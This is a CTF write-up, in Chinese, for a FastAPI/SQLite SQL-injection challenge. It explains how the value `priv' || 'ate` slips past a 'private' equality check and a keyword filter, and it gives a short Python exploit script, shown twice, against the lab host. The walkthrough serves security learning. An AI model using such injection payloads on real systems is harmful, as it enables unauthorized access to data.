## 1、题目描述

一个用 FastAPI + SQLite 实现的简易职位过滤接口，前端通过 POST /jobs 提交 JSON 参数 `job_type` 来筛选职位。服务端试图通过一个“字词替换”来阻止 SQL 注入（替换 `OR/AND/SELECT/UNION/FROM/WHERE` 的不同大小写），并且对 `job_type == 'private'` 做了直接拒绝（返回 403）。题目说明：A simple SQLi example with an allowlist filter of words to try to prevent exploitation。靶机地址： http://ip8000 。

## 2、知识点

- SQL 注入（SQLi）基础
- SQLite 特性：字符串连接运算符 `||` 会在 SQL 层将两个字面量拼接
- 服务端输入检查与替换顺序的重要性（先做等值判断再做替换会影响绕过策略）

## 3、题目解题方法思路

关键点：
- 代码先判断 `job_type == 'private'` 并返回 403（阻止直接请求 private）。
- 之后对输入执行替换，移除 `OR/AND/SELECT/UNION/FROM/WHERE`（含大小写），目的是阻止常见注入关键字。
- SQL 模板直接把 `job_type` 放入单引号内：
  `SELECT * FROM jobs WHERE type = '{job_type}'`
- 绕过思路：不用被替换的关键字，也不直接传 'private'，而是在 SQL 内使用 SQLite 的字符串连接运算符把两段字面量拼成 `private`。例如传入：
  `priv' || 'ate`
  生成的 SQL 为：
  `SELECT * FROM jobs WHERE type = 'priv' || 'ate'`
  SQLite 会先计算 `'priv' || 'ate'` → `'private'`，因此查询会匹配 `type='private'` 并返回包含 flag 的记录。

使用工具：源码阅读 + 发送 HTTP POST（PowerShell 的 `Invoke-RestMethod` 或 Python 的 `requests`）。

## 4、解题步骤

1. 阅读 `main.py`：发现在 `startup` 时把 flag 写入数据库 `jobs` 表的某条记录，且该记录 `type` 字段为 `"private"`（Hidden job）。
2. 在 `/jobs` 路由里发现：
   - 若 `job_type == 'private'` 则直接返回 403。
   - 之后循环替换 `['OR','or','AND','and','SELECT','select','UNION','union','FROM','from','WHERE','where']`。
   - 最终拼接查询字符串并直接执行，没有参数化（存在 SQL 注入危险）。
3. 推断绕过路径：由于直接比较 `job_type == 'private'` 在替换之前，不能直接发送 `private`；但可以通过在 SQL 层拼接字符串绕过。构造 `job_type` 为 `priv' || 'ate`，使 SQL 解析为 `type = 'priv' || 'ate'`，等价于 `type = 'private'`。
4. 发送请求并获取 flag：
```python
import requests
url = 'http://ip8000/jobs'
data = {"job_type": "priv' || 'ate"}
r = requests.post(url, json=data)
print(r.status_code)
print(r.text)
```

## 5、exp


```python
import requests
url = 'http://ip8000/jobs'
data = {"job_type": "priv' || 'ate"}
r = requests.post(url, json=data)
print(r.status_code)
print(r.text)
```

解释：
- 插入的 SQL 为： `SELECT * FROM jobs WHERE type = 'priv' || 'ate'`。
- SQLite 计算字符串连接表达式后变为 `type = 'private'`，进而返回 `private` 类型的行（其中 description 即 flag）。
